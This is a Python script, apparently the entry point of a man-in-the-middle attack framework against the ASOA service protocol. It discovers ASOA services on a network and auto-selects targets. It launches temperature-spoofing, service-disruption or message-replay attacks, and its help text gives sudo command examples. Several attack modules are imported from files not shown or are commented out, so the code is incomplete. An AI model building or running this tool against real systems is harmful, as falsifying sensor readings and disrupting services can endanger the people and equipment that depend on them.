#!/usr/bin/env python3
"""
ASOA Advanced MITM Attack System - Main Orchestrator
Sophisticated Man-in-the-Middle attack targeting real ASOA communication protocol
"""

import argparse
import signal
import sys
import time
import logging
from typing import Dict, List, Optional, Any
import threading

# Import ASOA MITM components
from asoa_protocol_analyzer import ASOAProtocolAnalyzer
from ucdr_handler import UCDRHandler
from asoa_message_modifier import ASOAMessageModifier
from network_discovery import ASOANetworkDiscovery
from platform_detector import PlatformDetector

# Import MITM engines
from mitm_engines.macos_asoa_mitm import MacOSASOAMITM
# from mitm_engines.linux_asoa_mitm import LinuxASOAMITM

# Import attack modules (will be created next)
# from attacks.temperature_spoof import TemperatureSpoofAttack
# from attacks.service_disruption import ServiceDisruptionAttack
# from attacks.message_replay import MessageReplayAttack

# Import utilities
from utils.logger import setup_logger
from utils.network_utils import get_default_gateway, get_interface_ip

class ASOAAdvancedMITM:
    """
    Advanced ASOA MITM Attack System
    Orchestrates sophisticated attacks against ASOA communication protocol
    """
    
    def __init__(self):
        self.logger = None
        self.platform_detector = None
        self.network_discovery = None
        self.message_modifier = None
        self.mitm_engine = None
        self.attack_module = None
        self.running = False
        self.config = {}
        
    def setup_logging(self, log_level: str = "INFO", log_file: str = None):
        """
        Setup logging system
        """
        self.logger = setup_logger("ASOA-MITM", log_level, log_file)
        self.logger.info("🚀 ASOA Advanced MITM Attack System Initializing...")
        
    def initialize_components(self):
        """
        Initialize all ASOA MITM components
        """
        try:
            # Initialize platform detection
            self.platform_detector = PlatformDetector(self.logger)
            
            # Validate platform
            is_valid, issues = self.platform_detector.validate_platform_for_asoa_mitm()
            if not is_valid:
                self.logger.error("❌ Platform validation failed:")
                for issue in issues:
                    self.logger.error(f"   - {issue}")
                return False
            
            self.logger.info("✅ Platform validation passed")
            
            # Initialize network discovery
            self.network_discovery = ASOANetworkDiscovery(self.logger)
            
            # Initialize message modifier
            self.message_modifier = ASOAMessageModifier(self.logger)
            
            # Initialize MITM engine based on platform
            if self.platform_detector.is_macos():
                self.mitm_engine = MacOSASOAMITM(self.logger)
                self.logger.info("📱 Using macOS ASOA MITM engine")
            elif self.platform_detector.is_linux():
                # self.mitm_engine = LinuxASOAMITM(self.logger)
                self.logger.info("🐧 Using Linux ASOA MITM engine")
            else:
                self.logger.error("❌ Unsupported platform for MITM engine")
                return False
            
            self.logger.info("✅ All components initialized successfully")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to initialize components: {e}")
            return False
    
    def discover_asoa_services(self, network_range: str = None, timeout: int = 30) -> Dict[str, Any]:
        """
        Discover ASOA services on the network
        """
        try:
            self.logger.info("🔍 Starting ASOA service discovery...")
            
            services = self.network_discovery.discover_asoa_services(network_range, timeout)
            
            if services:
                self.logger.info(f"✅ Discovered {len(services)} ASOA services:")
                for service_key, service in services.items():
                    self.logger.info(f"   📡 {service.service_name} at {service.ip_address}:{service.port}")
                    if service.temperature_flows:
                        self.logger.info(f"      🌡️  Temperature flows detected")
                
                # Get discovery summary
                summary = self.network_discovery.get_discovery_summary()
                self.logger.info(f"📊 Discovery Summary: {summary['total_services']} services, {summary['temperature_services']} with temperature flows")
                
                return services
            else:
                self.logger.warning("⚠️  No ASOA services discovered")
                return {}
                
        except Exception as e:
            self.logger.error(f"❌ Service discovery failed: {e}")
            return {}
    
    def setup_attack(self, attack_type: str, **kwargs) -> bool:
        """
        Setup attack module based on type
        """
        try:
            self.logger.info(f"⚔️  Setting up {attack_type} attack...")
            
            if attack_type == "temperature-spoof":
                # self.attack_module = TemperatureSpoofAttack(self.logger, **kwargs)
                self.logger.info(f"🌡️  Temperature spoof attack configured")
                self.logger.info(f"   Target temperature: {kwargs.get('target_temperature', 'Not specified')}°C")
                
            elif attack_type == "service-disrupt":
                # self.attack_module = ServiceDisruptionAttack(self.logger, **kwargs)
                self.logger.info(f"💥 Service disruption attack configured")
                self.logger.info(f"   Target service: {kwargs.get('target_service', 'Not specified')}")
                
            elif attack_type == "message-replay":
                # self.attack_module = MessageReplayAttack(self.logger, **kwargs)
                self.logger.info(f"🔄 Message replay attack configured")
                self.logger.info(f"   Replay count: {kwargs.get('replay_count', 1)}")
                
            else:
                self.logger.error(f"❌ Unknown attack type: {attack_type}")
                return False
            
            # Configure message modifier
            self.message_modifier.register_modification_callback(self._on_message_modified)
            
            self.logger.info("✅ Attack setup completed")
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Attack setup failed: {e}")
            return False
    
    def start_mitm_attack(self, target_ip: str = None, target_port: int = 7400) -> bool:
        """
        Start the MITM attack
        """
        try:
            self.logger.info("🚀 Starting ASOA MITM attack...")
            
            # Get target information
            if not target_ip:
                # Auto-discover targets
                services = self.discover_asoa_services()
                if not services:
                    self.logger.error("❌ No ASOA services found for attack")
                    return False
                
                # Select first service with temperature flows
                temperature_services = self.network_discovery.get_temperature_services()
                if temperature_services:
                    target_service = temperature_services[0]
                    target_ip = target_service.ip_address
                    target_port = target_service.port
                    self.logger.info(f"🎯 Auto-selected target: {target_service.service_name} at {target_ip}:{target_port}")
                else:
                    # Use first available service
                    first_service = list(services.values())[0]
                    target_ip = first_service.ip_address
                    target_port = first_service.port
                    self.logger.info(f"🎯 Auto-selected target: {first_service.service_name} at {target_ip}:{target_port}")
            
            # Configure MITM engine
            if self.mitm_engine:
                self.logger.info(f"🎯 Target configured: {target_ip}:{target_port}")
            
            # Start attack
            self.running = True
            
            # Start MITM engine
            if self.mitm_engine:
                # Get spoofed temperature from config
                spoofed_temp = self.config.get('spoofed_temperature', 999.9)
                success = self.mitm_engine.start_attack(target_ip, spoofed_temp)
                if success:
                    self.logger.info("✅ MITM engine started successfully")
                else:
                    self.logger.error("❌ Failed to start MITM engine")
                    return False
            
            # Start attack module
            if self.attack_module:
                # self.attack_module.start()
                self.logger.info("✅ Attack module started")
            
            self.logger.info("🎯 ASOA MITM attack is now running...")
            self.logger.info("   Press Ctrl+C to stop the attack")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ Failed to start MITM attack: {e}")
            return False
    
    def stop_mitm_attack(self):
        """
        Stop the MITM attack
        """
        try:
            self.logger.info("🛑 Stopping ASOA MITM attack...")
            
            self.running = False
            
            # Stop attack module
            if self.attack_module:
                # self.attack_module.stop()
                self.logger.info("✅ Attack module stopped")
            
            # Stop MITM engine
            if self.mitm_engine:
                self.mitm_engine.stop_attack()
                self.logger.info("✅ MITM engine stopped")
            
            # Stop network discovery
            if self.network_discovery:
                self.network_discovery.stop_discovery()
                self.logger.info("✅ Network discovery stopped")
            
            self.logger.info("✅ ASOA MITM attack stopped successfully")
            
        except Exception as e:
            self.logger.error(f"❌ Error stopping MITM attack: {e}")
    
    def _on_message_modified(self, modification):
        """
        Callback for message modifications
        """
        try:
            self.logger.info(f"🔧 Message modified: {modification.modification_type}")
            self.logger.info(f"   Original: {modification.original_value}")
            self.logger.info(f"   Modified: {modification.new_value}")
            
        except Exception as e:
            self.logger.error(f"Error in modification callback: {e}")
    
    def get_attack_stats(self) -> Dict[str, Any]:
        """
        Get attack statistics
        """
        stats = {
            'running': self.running,
            'platform': self.platform_detector.get_platform_capabilities() if self.platform_detector else {},
            'modification_stats': self.message_modifier.get_modification_stats() if self.message_modifier else {},
            'discovery_summary': self.network_discovery.get_discovery_summary() if self.network_discovery else {}
        }
        
        return stats
    
    def print_attack_stats(self):
        """
        Print current attack statistics
        """
        stats = self.get_attack_stats()
        
        print("\n📊 ASOA MITM Attack Statistics:")
        print("=" * 50)
        
        # Platform info
        platform_info = stats.get('platform', {})
        print(f"Platform: {platform_info.get('platform', 'Unknown')}")
        print(f"Packet Filter: {platform_info.get('packet_filter_method', 'Unknown')}")
        print(f"Root Privileges: {'✅' if platform_info.get('has_root_privileges') else '❌'}")
        
        # Modification stats
        mod_stats = stats.get('modification_stats', {})
        print(f"\nMessage Modifications:")
        print(f"  Total Packets: {mod_stats.get('total_packets', 0)}")
        print(f"  Modified Packets: {mod_stats.get('modified_packets', 0)}")
        print(f"  Temperature Modifications: {mod_stats.get('temperature_modifications', 0)}")
        print(f"  Failed Modifications: {mod_stats.get('failed_modifications', 0)}")
        
        # Discovery summary
        discovery_summary = stats.get('discovery_summary', {})
        print(f"\nNetwork Discovery:")
        print(f"  Total Services: {discovery_summary.get('total_services', 0)}")
        print(f"  Temperature Services: {discovery_summary.get('temperature_services', 0)}")
        
        print("=" * 50)

def signal_handler(signum, frame):
    """
    Handle interrupt signals
    """
    print("\n🛑 Received interrupt signal, stopping attack...")
    if hasattr(signal_handler, 'mitm_system'):
        signal_handler.mitm_system.stop_mitm_attack()
    sys.exit(0)

def main():
    """
    Main entry point for ASOA Advanced MITM Attack System
    """
    parser = argparse.ArgumentParser(
        description="ASOA Advanced MITM Attack System",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Discover ASOA services on network
  sudo python3 main.py --scan-asoa

  # Temperature spoofing attack
  sudo python3 main.py --attack temperature-spoof --target-temp 99.9

  # Service disruption attack
  sudo python3 main.py --attack service-disrupt --target-service Dashboard

  # Message replay attack
  sudo python3 main.py --attack message-replay --replay-count 10

  # Attack specific target
  sudo python3 main.py --attack temperature-spoof --target-ip 192.168.1.100 --target-temp 85.0
        """
    )
    
    # Main options
    parser.add_argument('--scan-asoa', action='store_true',
                       help='Scan network for ASOA services')
    parser.add_argument('--attack', choices=['temperature-spoof', 'service-disrupt', 'message-replay'],
                       help='Type of attack to perform')
    
    # Attack parameters
    parser.add_argument('--target-temp', type=float, default=99.9,
                       help='Target temperature for spoofing (default: 99.9)')
    parser.add_argument('--target-service', type=str,
                       help='Target service for disruption')
    parser.add_argument('--replay-count', type=int, default=1,
                       help='Number of times to replay messages (default: 1)')
    
    # Network options
    parser.add_argument('--target-ip', type=str,
                       help='Specific target IP address')
    parser.add_argument('--target-port', type=int, default=7400,
                       help='Target port (default: 7400)')
    parser.add_argument('--network-range', type=str,
                       help='Network range for discovery (e.g., 192.168.1.0/24)')
    
    # Logging options
    parser.add_argument('--log-level', choices=['DEBUG', 'INFO', 'WARNING', 'ERROR'],
                       default='INFO', help='Logging level (default: INFO)')
    parser.add_argument('--log-file', type=str,
                       help='Log file path')
    
    # Output options
    parser.add_argument('--stats', action='store_true',
                       help='Show attack statistics')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Initialize MITM system
    mitm_system = ASOAAdvancedMITM()
    
    # Setup signal handler
    signal_handler.mitm_system = mitm_system
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Setup logging
    log_level = 'DEBUG' if args.verbose else args.log_level
    mitm_system.setup_logging(log_level, args.log_file)
    
    # Initialize components
    if not mitm_system.initialize_components():
        sys.exit(1)
    
    try:
        if args.scan_asoa:
            # Discovery mode
            print("🔍 ASOA Service Discovery Mode")
            print("=" * 40)
            
            services = mitm_system.discover_asoa_services(args.network_range)
            
            if services:
                print(f"\n✅ Found {len(services)} ASOA services:")
                for service_key, service in services.items():
                    print(f"   📡 {service.service_name} at {service.ip_address}:{service.port}")
                    if service.temperature_flows:
                        print(f"      🌡️  Temperature flows detected")
            else:
                print("⚠️  No ASOA services found")
        
        elif args.attack:
            # Attack mode
            print(f"⚔️  ASOA MITM Attack Mode: {args.attack}")
            print("=" * 40)
            
            # Setup attack
            attack_kwargs = {}
            if args.attack == 'temperature-spoof':
                attack_kwargs['target_temperature'] = args.target_temp
            elif args.attack == 'service-disrupt':
                attack_kwargs['target_service'] = args.target_service
            elif args.attack == 'message-replay':
                attack_kwargs['replay_count'] = args.replay_count
            
            if not mitm_system.setup_attack(args.attack, **attack_kwargs):
                sys.exit(1)
            
            # Start attack
            if not mitm_system.start_mitm_attack(args.target_ip, args.target_port):
                sys.exit(1)
            
            # Keep running until interrupted
            try:
                while mitm_system.running:
                    time.sleep(1)
                    
                    # Show stats periodically
                    if args.stats and int(time.time()) % 30 == 0:
                        mitm_system.print_attack_stats()
                        
            except KeyboardInterrupt:
                pass
        
        else:
            # Show help if no action specified
            parser.print_help()
            sys.exit(1)
    
    except Exception as e:
        mitm_system.logger.error(f"❌ Fatal error: {e}")
        sys.exit(1)
    
    finally:
        # Cleanup
        mitm_system.stop_mitm_attack()

if __name__ == "__main__":
    main()
